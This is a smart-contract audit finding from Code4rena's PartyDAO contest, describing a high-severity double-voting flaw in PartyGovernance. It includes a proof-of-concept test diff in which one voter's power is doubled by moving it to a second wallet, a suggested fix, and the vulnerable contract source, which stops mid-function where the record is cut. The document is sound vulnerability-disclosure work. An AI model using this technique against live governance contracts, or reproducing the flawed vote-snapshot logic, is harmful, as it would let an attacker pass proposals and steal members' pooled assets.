{
  "Title": "[H-01] PartyGovernance: Can vote multiple times by transferring NFT in same block as proposal",
  "Content": "# Lines of code\n\nhttps://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L594\n\n\n# Vulnerability details\n\n## Impact\n`PartyGovernanceNFT` uses the voting power at the time of proposal when calling `accept`. The problem with that is that a user can vote, transfer the NFT (and the voting power) to a different wallet, and then vote from this second wallet again during the same block that the proposal was created. \nThis can also be repeated multiple times to get an arbitrarily high voting power and pass every proposal unanimously. \n\nThe consequences of this are very severe. Any user (no matter how small his voting power is) can propose and pass arbitrary proposals animously and therefore steal all assets (including the precious tokens) out of the party.\n\n## Proof Of Concept\nThis diff shows how a user with a voting power of 50/100 gets a voting power of 100/100 by transferring the NFT to a second wallet that he owns and voting from that one:\n```diff\n--- a/sol-tests/party/PartyGovernanceUnit.t.sol\n+++ b/sol-tests/party/PartyGovernanceUnit.t.sol\n@@ -762,6 +762,7 @@ contract PartyGovernanceUnitTest is Test, TestUtils {\n         TestablePartyGovernance gov =\n             _createGovernance(100e18, preciousTokens, preciousTokenIds);\n         address undelegatedVoter = _randomAddress();\n+        address recipient = _randomAddress();\n         // undelegatedVoter has 50/100 intrinsic VP (delegated to no one/self)\n         gov.rawAdjustVotingPower(undelegatedVoter, 50e18, address(0));\n \n@@ -772,38 +773,13 @@ contract PartyGovernanceUnitTest is Test, TestUtils {\n         // Undelegated voter submits proposal.\n         vm.prank(undelegatedVoter);\n         assertEq(gov.propose(proposal, 0), proposalId);\n-\n-        // Try to execute proposal (fail).\n-        vm.expectRevert(abi.encodeWithSelector(\n-            PartyGovernance.BadProposalStatusError.selector,\n-            PartyGovernance.ProposalStatus.Voting\n-        ));\n-        vm.prank(undelegatedVoter);\n-        gov.execute(\n-            proposalId,\n-            proposal,\n-            preciousTokens,\n-            preciousTokenIds,\n-            \"\",\n-            \"\"\n-        );\n-\n-        // Skip past execution delay.\n-        skip(defaultGovernanceOpts.executionDelay);\n-        // Try again (fail).\n-        vm.expectRevert(abi.encodeWithSelector(\n-            PartyGovernance.BadProposalStatusError.selector,\n-            PartyGovernance.ProposalStatus.Voting\n-        ));\n-        vm.prank(undelegatedVoter);\n-        gov.execute(\n-            proposalId,\n-            proposal,\n-            preciousTokens,\n-            preciousTokenIds,\n-            \"\",\n-            \"\"\n-        );\n+        (, PartyGovernance.ProposalStateValues memory valuesPrev) = gov.getProposalStateInfo(proposalId);\n+        assertEq(valuesPrev.votes, 50e18);\n+        gov.transferVotingPower(undelegatedVoter, recipient, 50e18); //Simulate NFT transfer\n+        vm.prank(recipient);\n+        gov.accept(proposalId, 0);\n+        (, PartyGovernance.ProposalStateValues memory valuesAfter) = gov.getProposalStateInfo(proposalId);\n+        assertEq(valuesAfter.votes, 100e18);\n     }\n```\n\n## Recommended Mitigation Steps\nYou should query the voting power at `values.proposedTime - 1`. This value is already finalized when the proposal is created and therefore cannot be manipulated by repeatedly transferring the voting power to different wallets.",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-09-partydao-contest",
  "Code": [
    {
      "filename": "contracts/party/PartyGovernance.sol",
      "content": "// SPDX-License-Identifier: Beta Software\npragma solidity ^0.8;\n\nimport \"../distribution/ITokenDistributorParty.sol\";\nimport \"../distribution/ITokenDistributor.sol\";\nimport \"../utils/ReadOnlyDelegateCall.sol\";\nimport \"../tokens/IERC721.sol\";\nimport \"../tokens/IERC20.sol\";\nimport \"../tokens/IERC1155.sol\";\nimport \"../tokens/ERC721Receiver.sol\";\nimport \"../tokens/ERC1155Receiver.sol\";\nimport \"../utils/LibERC20Compat.sol\";\nimport \"../utils/LibRawResult.sol\";\nimport \"../utils/LibSafeCast.sol\";\nimport \"../globals/IGlobals.sol\";\nimport \"../globals/LibGlobals.sol\";\nimport \"../proposals/IProposalExecutionEngine.sol\";\nimport \"../proposals/LibProposal.sol\";\nimport \"../proposals/ProposalStorage.sol\";\n\nimport \"./IPartyFactory.sol\";\n\n/// @notice Base contract for a Party encapsulating all governance functionality.\nabstract contract PartyGovernance is\n    ITokenDistributorParty,\n    ERC721Receiver,\n    ERC1155Receiver,\n    ProposalStorage,\n    Implementation,\n    ReadOnlyDelegateCall\n{\n    using LibERC20Compat for IERC20;\n    using LibRawResult for bytes;\n    using LibSafeCast for uint256;\n    using LibSafeCast for int192;\n    using LibSafeCast for uint96;\n\n    // States a proposal can be in.\n    enum ProposalStatus {\n        // The proposal does not exist.\n        Invalid,\n        // The proposal has been proposed (via `propose()`), has not been vetoed\n        // by a party host, and is within the voting window. Members can vote on\n        // the proposal and party hosts can veto the proposal.\n        Voting,\n        // The proposal has either exceeded its voting window without reaching\n        // `passThresholdBps` of votes or was vetoed by a party host.\n        Defeated,\n        // The proposal reached at least `passThresholdBps` of votes but is still\n        // waiting for `executionDelay` to pass before it can be executed. Members\n        // can continue to vote on the proposal and party hosts can veto at this time.\n        Passed,\n        // Same as `Passed` but now `executionDelay` has been satisfied. Any member\n        // may execute the proposal via `execute()`, unless `maxExecutableTime`\n        // has arrived.\n        Ready,\n        // The proposal has been executed at least once but has further steps to\n        // complete so it needs to be executed again. No other proposals may be\n        // executed while a proposal is in the `InProgress` state. No voting or\n        // vetoing of the proposal is allowed, however it may be forcibly cancelled\n        // via `cancel()` if the `cancelDelay` has passed since being first executed.\n        InProgress,\n        // The proposal was executed and completed all its steps. No voting or\n        // vetoing can occur and it cannot be cancelled nor executed again.\n        Complete,\n        // The proposal was executed at least once but did not complete before\n        // `cancelDelay` seconds passed since the first execute and was forcibly cancelled.\n        Cancelled\n    }\n\n    struct GovernanceOpts {\n        // Address of initial party hosts.\n        address[] hosts;\n        // How long people can vote on a proposal.\n        uint40 voteDuration;\n        // How long to wait after a proposal passes before it can be\n        // executed.\n        uint40 executionDelay;\n        // Minimum ratio of accept votes to consider a proposal passed,\n        // in bps, where 10,000 == 100%.\n        uint16 passThresholdBps;\n        // Total voting power of governance NFTs.\n        uint96 totalVotingPower;\n        // Fee bps for distributions.\n        uint16 feeBps;\n        // Fee recipeint for distributions.\n        address payable feeRecipient;\n    }\n\n    // Subset of `GovernanceOpts` that are commonly read together for\n    // efficiency.\n    struct GovernanceValues {\n        uint40 voteDuration;\n        uint40 executionDelay;\n        uint16 passThresholdBps;\n        uint96 totalVotingPower;\n    }\n\n    // A snapshot of voting power for a member.\n    struct VotingPowerSnapshot {\n        // The timestamp when the snapshot was taken.\n        uint40 timestamp;\n        // Voting power that was delegated to this user by others.\n        uint96 delegatedVotingPower;\n        // The intrinsic (not delegated from someone else) voting power of this user.\n        uint96 intrinsicVotingPower;\n        // Whether the user was delegated to another at this snapshot.\n        bool isDelegated;\n    }\n\n    // Proposal details chosen by proposer.\n    struct Proposal {\n        // Time beyond which the proposal can no longer be executed.\n        // If the proposal has already been executed, and is still InProgress,\n        // this value is ignored.\n        uint40 maxExecutableTime;\n        // The minimum seconds this proposal can remain in the InProgress status\n        // before it can be cancelled.\n        uint40 cancelDelay;\n        // Encoded proposal data. The first 4 bytes are the proposal type, followed\n        // by encoded proposal args specific to the proposal type. See\n        // ProposalExecutionEngine for details.\n        bytes proposalData;\n    }\n\n    // Accounting and state tracking values for a proposal.\n    // Fits in a word.\n    struct ProposalStateValues {\n        // When the proposal was proposed.\n        uint40 proposedTime;\n        // When the proposal passed the vote.\n        uint40 passedTime;\n        // When the proposal was first executed.\n        uint40 executedTime;\n        // When the proposal completed.\n        uint40 completedTime;\n        // Number of accept votes.\n        uint96 votes; // -1 == vetoed\n    }\n\n    // Storage states for a proposal.\n    struct ProposalState {\n        // Accounting and state tracking values.\n        ProposalStateValues values;\n        // Hash of the proposal.\n        bytes32 hash;\n        // Whether a member has voted for (accepted) this proposal already.\n        mapping (address => bool) hasVoted;\n    }\n\n    event Proposed(\n        uint256 proposalId,\n        address proposer,\n        Proposal proposal\n    );\n    event ProposalAccepted(\n        uint256 proposalId,\n        address voter,\n        uint256 weight\n    );\n\n    event PartyInitialized(GovernanceOpts opts, IERC721[] preciousTokens, uint256[] preciousTokenIds);\n    event ProposalPassed(uint256 indexed proposalId);\n    event ProposalVetoed(uint256 indexed proposalId, address host);\n    event ProposalExecuted(uint256 indexed proposalId, address executor, bytes nextProgressData);\n    event ProposalCancelled(uint256 indexed proposalId);\n    event DistributionCreated(ITokenDistributor.TokenType tokenType, address token, uint256 tokenId);\n    event VotingPowerDelegated(address indexed owner, address indexed delegate);\n    event HostStatusTransferred(address oldHost, address newHost);\n\n    error MismatchedPreciousListLengths();\n    error BadProposalStatusError(ProposalStatus status);\n    error ProposalExistsError(uint256 proposalId);\n    error BadProposalHashError(bytes32 proposalHash, bytes32 actualHash);\n    error ProposalHasNoVotesError(uint256 proposalId);\n    error ExecutionTimeExceededError(uint40 maxExecutableTime, uint40 timestamp);\n    error OnlyPartyHostError();\n    error OnlyActiveMemberError();\n    error InvalidDelegateError();\n    error BadPreciousListError();\n    error OnlyPartyDaoError(address notDao, address partyDao);\n    error OnlyPartyDaoOrHostError(address notDao, address partyDao);\n    error OnlyWhenEmergencyActionsAllowedError();\n    error AlreadyVotedError(address voter);\n    error InvalidNewHostError();\n    error ProposalCannotBeCancelledYetError(uint40 currentTime, uint40 cancelTime);\n    error InvalidBpsError(uint16 bps);\n\n    uint256 constant private UINT40_HIGH_BIT = 1 << 39;\n    uint96 constant private VETO_VALUE = uint96(int96(-1));\n\n    // The `Globals` contract storing global configuration values. This contract\n    // is immutable and itâ€™s address will never change.\n    IGlobals private immutable _GLOBALS;\n\n    /// @notice Whether the DAO has emergency powers for this party.\n    bool public emergencyExecuteDisabled;\n    /// @notice Distribution fee bps.\n    uint16 public feeBps;\n    /// @notice Distribution fee recipient.\n    address payable public feeRecipient;\n    /// @notice The hash of the list of precious NFTs guarded by the party.\n    bytes32 public preciousListHash;\n    /// @notice The last proposal ID that was used. 0 means no proposals have been made.\n    uint256 public lastProposalId;\n    /// @notice Whether an address is a party host.\n    mapping(address => bool) public isHost;\n    /// @notice The last person a voter delegated its voting power to.\n    mapping(address => address) public delegationsByVoter;\n    // Constant governance parameters, fixed from the inception of this party.\n    GovernanceValues private _governanceValues;\n    // ProposalState by proposal ID.\n    mapping(uint256 => ProposalState) private _proposalStateByProposalId;\n    // Snapshots of voting power per user, each sorted by increasing time.\n    mapping(address => VotingPowerSnapshot[]) private _votingPowerSnapshotsByVoter;\n\n    modifier onlyHost() {\n        if (!isHost[msg.sender]) {\n            revert OnlyPartyHostError();\n        }\n        _;\n    }\n\n    // Caller must own a governance NFT at the current time.\n    modifier onlyActiveMember() {\n        {\n            VotingPowerSnapshot memory snap =\n                _getLastVotingPowerSnapshotForVoter(msg.sender);\n            // Must have either delegated voting power or intrinsic voting power.\n            if (snap.intrinsicVotingPower == 0 && snap.delegatedVotingPower == 0) {\n                revert OnlyActiveMemberError();\n            }\n        }\n        _;\n    }\n\n    // Only the party DAO multisig can call.\n    modifier onlyPartyDao() {\n        {\n            address partyDao = _GLOBALS.getAddress(LibGlobals.GLOBAL_DAO_WALLET);\n            if (msg.sender != partyDao) {\n                revert OnlyPartyDaoError(msg.sender, partyDao);\n            }\n        }\n        _;\n    }\n\n    // Only the party DAO multisig or a party host can call.\n    modifier onlyPartyDaoOrHost() {\n        address partyDao = _GLOBALS.getAddress(LibGlobals.GLOBAL_DAO_WALLET);\n        if (msg.sender != partyDao && !isHost[msg.sender]) {\n            revert OnlyPartyDaoOrHostError(msg.sender, partyDao);\n        }\n        _;\n    }\n\n    // Only if `emergencyExecuteDisabled` is not true.\n    modifier onlyWhenEmergencyExecuteAllowed() {\n        if (emergencyExecuteDisabled) {\n            revert OnlyWhenEmergencyActionsAllowedError();\n        }\n        _;\n    }\n\n    // Set the `Globals` contract.\n    constructor(IGlobals globals) {\n        _GLOBALS = globals;\n    }\n\n    // Initialize storage for proxy contracts and initialize the proposal execution engine.\n    function _initialize(\n        GovernanceOpts memory opts,\n        IERC721[] memory preciousTokens,\n        uint256[] memory preciousTokenIds\n    )\n        internal\n        virtual\n    {\n        // Check BPS are valid.\n        if (opts.feeBps > 1e4) {\n            revert InvalidBpsError(opts.feeBps);\n        }\n        if (opts.passThresholdBps > 1e4) {\n            revert InvalidBpsError(opts.passThresholdBps);\n        }\n        // Initialize the proposal execution engine.\n        _initProposalImpl(\n            IProposalExecutionEngine(\n                _GLOBALS.getAddress(LibGlobals.GLOBAL_PROPOSAL_ENGINE_IMPL)\n            ),\n            \"\"\n        );\n        // Set the governance parameters.\n        _governanceValues = GovernanceValues({\n            voteDuration: opts.voteDuration,\n            executionDelay: opts.executionDelay,\n            passThresholdBps: opts.passThresholdBps,\n            totalVotingPower: opts.totalVotingPower\n        });\n        // Set fees.\n        feeBps = opts.feeBps;\n        feeRecipient = opts.feeRecipient;\n        // Set the precious list.\n        _setPreciousList(preciousTokens, preciousTokenIds);\n        // Set the party hosts.\n        for (uint256 i=0; i < opts.hosts.length; ++i) {\n            isHost[opts.hosts[i]] = true;\n        }\n        emit PartyInitialized(opts, preciousTokens, preciousTokenIds);\n    }\n\n    /// @dev Forward all unknown read-only calls to the proposal execution engine.\n    ///      Initial use case is to facilitate eip-1271 signatures.\n    fallback() external {\n        _readOnlyDelegateCall(\n            address(_getProposalExecutionEngine()),\n            msg.data\n        );\n    }\n\n    /// @inheritdoc EIP165\n    /// @dev Combined logic for `ERC721Receiver` and `ERC1155Receiver`.\n    function supportsInterface(bytes4 interfaceId)\n        public\n        override(ERC721Receiver, ERC1155Receiver)\n        virtual\n        pure\n        returns (bool)\n    {\n        return ERC721Receiver.supportsInterface(interfaceId) ||\n            ERC1155Receiver.supportsInterface(interfaceId);\n    }\n\n    /// @notice Get the current `ProposalExecutionEngine` instance.\n    function getProposalExecutionEngine()\n        external\n        view\n        returns (IProposalExecutionEngine)\n    {\n        return _getProposalExecutionEngine();\n    }\n\n    /// @notice Get the total voting power of `voter` at a `timestamp`.\n    /// @param voter The address of the voter.\n    /// @param timestamp The timestamp to get the voting power at.\n    /// @return votingPower The total voting power of `voter` at `timestamp`.\n    function getVotingPowerAt(address voter, uint40 timestamp)\n        external\n        view\n        returns (uint96 votingPower)\n    {\n        return getVotingPowerAt(voter, timestamp, type(uint256).max);\n    }\n\n    /// @notice Get the total voting power of `voter` at a snapshot `snapIndex`, with checks to\n    ///         make sure it is the latest voting snapshot =< `timestamp`.\n    /// @param voter The address of the voter.\n    /// @param timestamp The timestamp to get the voting power at.\n    /// @param snapIndex The index of the snapshot to get the voting power at.\n    /// @return votingPower The total voting power of `voter` at `timestamp`.\n    function getVotingPowerAt(address voter, uint40 timestamp, uint256 snapIndex)\n        public\n        view\n        returns (uint96 votingPower)\n    {\n        VotingPowerSnapshot memory snap = _getVotingPowerSnapshotAt(voter, timestamp, snapIndex);\n        return (snap.isDelegated ? 0 : snap.intrinsicVotingPower) + snap.delegatedVotingPower;\n    }\n\n    /// @notice Get the state of a proposal.\n    /// @param proposalId The ID of the proposal.\n    /// @return status The status of the proposal.\n    /// @return values The state of the proposal.\n    function getProposalStateInfo(uint256 proposalId)\n        external\n        view\n        returns (ProposalStatus status, ProposalStateValues memory values)\n    {\n        values = _proposalStateByProposalId[proposalId].values;\n        status = _getProposalStatus(values);\n    }\n\n    /// @notice Retrieve fixed governance parameters.\n    /// @return gv The governance parameters of this party.\n    function getGovernanceValues() external view returns (GovernanceValues memory gv) {\n        return _governanceValues;\n    }\n\n    /// @notice Get the hash of a proposal.\n    /// @dev Proposal details are not stored on-chain so the hash is used to enforce\n    ///      consistency between calls.\n    /// @param proposal The proposal to hash.\n    /// @return proposalHash The hash of the proposal.\n    function getProposalHash(Proposal memory proposal)\n        public\n        pure\n        returns (bytes32 proposalHash)\n    {\n        // Hash the proposal in-place. Equivalent to:\n        // keccak256(abi.encode(\n        //   proposal.maxExecutableTime,\n        //   proposal.cancelDelay,\n        //   keccak256(proposal.proposalData)\n        // ))\n        bytes32 dataHash = keccak256(proposal.proposalData);\n        assembly {\n            // Overwrite the data field with the hash of its contents and then\n            // hash the struct.\n            let dataPos := add(proposal, 0x40)\n            let t := mload(dataPos)\n            mstore(dataPos, dataHash)\n            proposalHash := keccak256(proposal, 0x60)\n            // Restore the data field.\n            mstore(dataPos, t)\n        }\n    }\n\n    /// @notice Get the index of the most recent voting power snapshot <= `timestamp`.\n    /// @param voter The address of the voter.\n    /// @param timestamp The timestamp to get the snapshot index at.\n    /// @return index The index of the snapshot.\n    function findVotingPowerSnapshotIndex(address voter, uint40 timestamp)\n        public\n        view\n        returns (uint256 index)\n    {\n        VotingPowerSnapshot[] storage snaps = _votingPowerSnapshotsByVoter[voter];\n\n        // Derived from Open Zeppelin binary search\n        // ref: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Checkpoints.sol#L39\n        uint256 high = snaps.length;\n        uint256 low = 0;\n        while (low < high) {\n            uint256 mid = (low + high) / 2;\n            if (snaps[mid].timestamp > timestamp) {\n                // Entry is too recent.\n                high = mid;\n            } else {\n                // Entry is older. This is our best guess for now.\n                low = mid + 1;\n            }\n        }\n\n        // Return `type(uint256).max` if no valid voting snapshots found.\n        return high == 0 ? type(uint256).max : high - 1;\n    }\n\n    /// @notice Pledge your intrinsic voting power to a new delegate, removing it from\n    ///         the old one (if any).\n    /// @param delegate The address to delegating voting power to.\n    function delegateVotingPower(address delegate) external onlyDelegateCall {\n        _adjustVotingPower(msg.sender, 0, delegate);\n        emit VotingPowerDelegated(msg.sender, delegate);\n    }\n\n    /// @notice Transfer party host status to another.\n    /// @param newPartyHost The address of the new host.\n    function abdicate(address newPartyHost) external onlyHost onlyDelegateCall {\n        // 0 is a special case burn address.\n        if (newPartyHost != address(0)) {\n            // Cannot transfer host status to an existing host.\n            if(isHost[newPartyHost]) {\n                revert InvalidNewHostError();\n            }\n            isHost[newPartyHost] = true;\n        }\n        isHost[msg.sender] = false;\n        emit HostStatusTransferred(msg.sender, newPartyHost);\n    }\n\n    /// @notice Create a token distribution by moving the party's entire balance\n    ///         to the `TokenDistributor` contract and immediately creating a\n    ///         distribution governed by this party.\n    /// @dev The `feeBps` and `feeRecipient` this party was created with will be\n    ///      propagated to the distribution. Party members are entitled to a\n    ///      share of the distribution's tokens proportionate to their relative\n    ///      voting power in this party (less the fee).\n    /// @param tokenType The type of token to distribute.\n    /// @param token The address of the token to distribute.\n    /// @param tokenId The ID of the token to distribute. Currently unused but\n    ///                may be used in the future to support other distribution types.\n    /// @return distInfo The information about the created distribution.\n    function distribute(\n        ITokenDistributor.TokenType tokenType,\n        address token,\n        uint256 tokenId\n    )\n        external\n        onlyActiveMember\n        onlyDelegateCall\n        returns (ITokenDistributor.DistributionInfo memory distInfo)\n    {\n        // Get the address of the token distributor.\n        ITokenDistributor distributor = ITokenDistributor(\n            _GLOBALS.getAddress(LibGlobals.GLOBAL_TOKEN_DISTRIBUTOR)\n        );\n        emit DistributionCreated(tokenType, token, tokenId);\n        // Create a native token distribution.\n        if (tokenType == ITokenDistributor.TokenType.Native) {\n            return distributor.createNativeDistribution\n                { value: address(this).balance }(this, feeRecipient, feeBps);\n        }\n        // Otherwise must be an ERC20 token distribution.\n        assert(tokenType == ITokenDistributor.TokenType.Erc20);\n        IERC20(token).compatTransfer(\n            address(distributor),\n            IERC20(token).balanceOf(address(this))\n        );\n        return distributor.createErc20Distribution(\n            IERC20(token),\n            this,\n            feeRecipient,\n            feeBps\n        );\n    }\n\n    /// @notice Make a proposal for members to vote on and cast a vote to accept it\n    ///         as well.\n    /// @dev Only an active member (owns a governance token) can call this.\n    ///      Afterwards, members can vote to support it with accept() or a party\n    ///      host can unilaterally reject the proposal with veto().\n    /// @param proposal The details of the proposal.\n    /// @param latestSnapIndex The index of the caller's most recent voting power\n    ///                        snapshot before the proposal was created. Should\n    ///                        be retrieved off-chain and passed in.\n    function propose(Proposal memory proposal, uint256 latestSnapIndex)\n        external\n        onlyActiveMember\n        onlyDelegateCall\n        returns (uint256 proposalId)\n    {\n        proposalId = ++lastProposalId;\n        // Store the time the proposal was created and the proposal hash.\n        (\n            _proposalStateByProposalId[proposalId].values,\n            _proposalStateByProposalId[proposalId].hash\n        ) = (\n            ProposalStateValues({\n                proposedTime: uint40(block.timestamp),\n                passedTime: 0,\n                executedTime: 0,\n                completedTime: 0,\n                votes: 0\n            }),\n            getProposalHash(proposal)\n        );\n        emit Proposed(proposalId, msg.sender, proposal);\n        accept(proposalId, latestSnapIndex);\n    }\n\n    /// @notice Vote to support a proposed proposal.\n    /// @dev The voting power cast will be the effective voting power of the caller\n    ///      at the time propose() was called (see `getVotingPowerAt()`).\n    ///      If the proposal reaches `passThresholdBps` acceptance ratio then the\n    ///      proposal will be in the `Passed` state and will be executable after\n    ///      the `executionDelay` has passed, putting it in the `Ready` state.\n    /// @param proposalId The ID of the proposal to accept.\n    /// @param snapIndex The index of the caller's last voting power snapshot\n    ///                  before the proposal was created. Should be retrieved\n    ///                  off-chain and passed in.\n    /// @return totalVotes The total votes cast on the proposal.\n    function accept(uint256 proposalId, uint256 snapIndex)\n        public\n        onlyDelegateCall\n        returns (uint256 totalVotes)\n    {\n        // Get the information about the proposal.\n        ProposalState storage info = _proposalStateByProposalId[proposalId];\n        ProposalStateValues memory values = info.values;\n\n        // Can only vote in certain proposal statuses.\n        {\n            ProposalStatus status = _getProposalStatus(values);\n            // Allow voting even if the proposal is passed/ready so it can\n            // potentially reach 100% consensus, which unlocks special\n            // behaviors for certain proposal types.\n            if (\n                status != ProposalStatus.Voting &&\n                status != ProposalStatus.Passed &&\n                status != ProposalStatus.Ready\n            ) {\n                revert BadProposalStatusError(status);\n            }\n        }\n\n        // Cannot vote twice.\n        if (info.hasVoted[msg.sender]) {\n            revert AlreadyVotedError(msg.sender);\n        }\n        // Mark the caller as having voted.\n        info.hasVoted[msg.sender] = true;\n\n        // Increase the total votes that have been cast on this proposal.\n        uint96 votingPower = getVotingPowerAt(msg.sender, values.proposedTime, snapIndex);\n        values.votes += votingPower;\n        info.values = values;\n        emit ProposalAccepted(proposalId, msg.sender, votingPower);\n\n        // Update the proposal status if it has reached the pass threshold.\n        if (values.passedTime == 0 && _areVotesPassing(\n            values.votes,\n            _governanceValues.totalVotingPower,\n            _governanceValues.passThresholdBps))\n        {\n            info.values.passedTime = uint40(block.timestamp);\n            emit ProposalPassed(proposalId);\n        }\n        return values.votes;\n    }\n\n    /// @notice As a party host, veto a proposal, unilaterally rejecting it.\n    /// @dev The proposal will never be executable and cannot be voted on anymore.\n    ///      A proposal that has been already executed at least once (in the `InProgress` status)\n    ///      cannot be vetoed.\n    /// @param proposalId The ID of the proposal to veto.\n    function veto(uint256 proposalId) external onlyHost onlyDelegateCall {\n        // Setting `votes` to -1 indicates a veto.\n        ProposalState storage info = _proposalStateByProposalId[proposalId];\n        ProposalStateValues memory values = info.values;\n\n        {\n            ProposalStatus status = _getProposalStatus(values);\n            // Proposal must be in one of the following states.\n            if (\n                status != ProposalStatus.Voting &&\n                status != ProposalStatus.Passed &&\n                status != ProposalStatus.Ready\n            ) {\n                revert BadProposalStatusError(status);\n            }\n        }\n\n        // -1 indicates veto.\n        info.values.votes = VETO_VALUE;\n        emit ProposalVetoed(proposalId, msg.sender);\n    }\n\n    /// @notice Executes a proposal that has passed governance.\n    /// @dev The proposal must be in the `Ready` or `InProgress` status.\n    ///      A `ProposalExecuted` event will be emitted with a non-empty `nextProgressData`\n    ///      if the proposal has extra steps (must be executed again) to carry out,\n    ///      in which case `nextProgressData` should be passed into the next `execute()` call.\n    ///      The `ProposalExecutionEngine` enforces that only one `InProgress` proposal\n    ///      is active at a time, so that proposal must be completed or cancelled via `cancel()`\n    ///      in order to execute a different proposal.\n    ///      `extraData` is optional, off-chain data a proposal might need to execute a step.\n    /// @param proposalId The ID of the proposal to execute.\n    /// @param proposal The details of the proposal.\n    /// @param preciousTokens The tokens that the party considers precious.\n    /// @param preciousTokenIds The token IDs associated with each precious token.\n    /// @param progressData The data returned from the last `execute()` call, if any.\n    /// @param extraData Off-chain data a proposal might need to execute a step.\n    function execute(\n        uint256 proposalId,\n        Proposal memory proposal,\n        IERC721[] memory preciousTokens,\n        uint256[] memory preciousTokenIds,\n        bytes calldata progressData,\n        bytes calldata extraData\n    )\n        external\n        payable\n        onlyActiveMember\n        onlyDelegateCall\n    {\n        // Get information about the proposal.\n        ProposalState storage proposalState = _proposalStateByProposalId[proposalId];\n        // Proposal details must remain the same from `propose()`.\n        _validateProposalHash(proposal, proposalState.hash);\n        ProposalStateValues memory values = proposalState.values;\n        ProposalStatus status = _getProposalStatus(values);\n        // The proposal must be executable or have already been executed but still\n        // has more steps to go.\n        if (status != ProposalStatus.Ready && status != ProposalStatus.InProgress) {\n            revert BadProposalStatusError(status);\n        }\n        if (status == ProposalStatus.Ready) {\n            // If the proposal has not been executed yet, make sure it hasn't\n            // expired. Note that proposals that have been executed\n            // (but still have more steps) ignore `maxExecutableTime`.\n            if (proposal.maxExecutableTime < block.timestamp) {\n                revert ExecutionTimeExceededError(\n                    proposal.maxExecutableTime,\n                    uint40(block.timestamp)\n                );\n            }\n            proposalState.values.executedTime = uint40(block.timestamp);\n        }\n        // Check that the precious list is valid.\n        if (!_isPreciousListCorrect(preciousTokens, preciousTokenIds)) {\n            revert BadPreciousListError();\n        }\n        // Preemptively set the proposal to completed to avoid it being executed\n        // again in a deeper call.\n        proposalState.values.completedTime = uint40(block.timestamp);\n        // Execute the proposal.\n        bool completed = _executeProposal(\n            proposalId,\n            proposal,\n            preciousTokens,\n            preciousTokenIds,\n            _getProposalFlags(values),\n            progressData,\n            extraData\n        );\n        if (!completed) {\n            // Proposal did not complete.\n            proposalState.values.completedTime = 0;\n        }\n    }\n\n    /// @notice Cancel a (probably stuck) InProgress proposal.\n    /// @dev proposal.cancelDelay seconds must have passed since it was first\n    ///       executed for this to be valid.\n    ///       The currently active proposal will simply be yeeted out of existence\n    ///       so another proposal can execute.\n    ///       This is intended to be a last resort and can leave the party\n    ///       in a broken state. Whenever possible, active proposals should be\n    ///       allowed to complete their lifecycle.\n    /// @param proposalId The ID of the proposal to cancel.\n    /// @param proposal The details of the proposal to cancel.\n    function cancel(uint256 proposalId, Proposal calldata proposal)\n        external\n        onlyActiveMember\n        onlyDelegateCall\n    {\n        // Get information about the proposal.\n        ProposalState storage proposalState = _proposalStateByProposalId[proposalId];\n        // Proposal details must remain the same from `propose()`.\n        _validateProposalHash(proposal, proposalState.hash);\n        ProposalStateValues memory values = proposalState.values;\n        {\n            // Must be `InProgress`.\n            ProposalStatus status = _getProposalStatus(values);\n            if (status != ProposalStatus.InProgress) {\n                revert BadProposalStatusError(status);\n            }\n        }\n        {\n            // Limit the maximum `cancelDelay` to the global max cancel delay\n            // to mitigate parties accidentally getting stuck forever by setting an\n            // unrealistic `cancelDelay`.\n            uint256 cancelDelay = proposal.cancelDelay;\n            uint256 globalMaxCancelDelay =\n                _GLOBALS.getUint256(LibGlobals.GLOBAL_PROPOSAL_MAX_CANCEL_DURATION);\n            if (globalMaxCancelDelay != 0) { // Only if we have one set.\n                if (cancelDelay > globalMaxCancelDelay) {\n                    cancelDelay = globalMaxCancelDelay;\n                }\n            }\n            uint256 cancelTime = values.executedTime + cancelDelay;\n            // Must not be too early.\n            if (block.timestamp < cancelTime) {\n                revert ProposalCannotBeCancelledYetError(\n                    uint40(block.timestamp),\n                    uint40(cancelTime)\n                );\n            }\n        }\n        // Mark the proposal as cancelled by setting the completed time to the current\n        // time with the high bit set.\n        proposalState.values.completedTime = uint40(block.timestamp | UINT40_HIGH_BIT);\n        {\n            // Delegatecall into the proposal engine impl to perform the cancel.\n            (bool success, bytes memory resultData) =\n            (address(_getProposalExecutionEngine())).delegatecall(abi.encodeCall(\n                IProposalExecutionEngine.cancelProposal,\n                (proposalId)\n            ));\n            if (!success) {\n                resultData.rawRevert();\n            }\n        }\n        emit ProposalCancelled(proposalId);\n    }\n\n    /// @notice As the DAO, execute an arbitrary function call from this contract.\n    /// @dev Emergency actions must not be revoked for this to work.\n    /// @param targetAddress The contract to call.\n    /// @param targetCallData The data to pass to the contract.\n    /// @param amountEth The amount of ETH to send to the contract.\n    /// @param success Whether the call succeeded.\n    function emergencyExecute(\n        address targetAddress,\n        bytes calldata targetCallData,\n        uint256 amountEth\n    )\n        external\n        payable\n        onlyPartyDao\n        onlyWhenEmergencyExecuteAllowed\n        onlyDelegateCall\n        returns (bool success)\n    {\n        (success,"
    }
  ]
}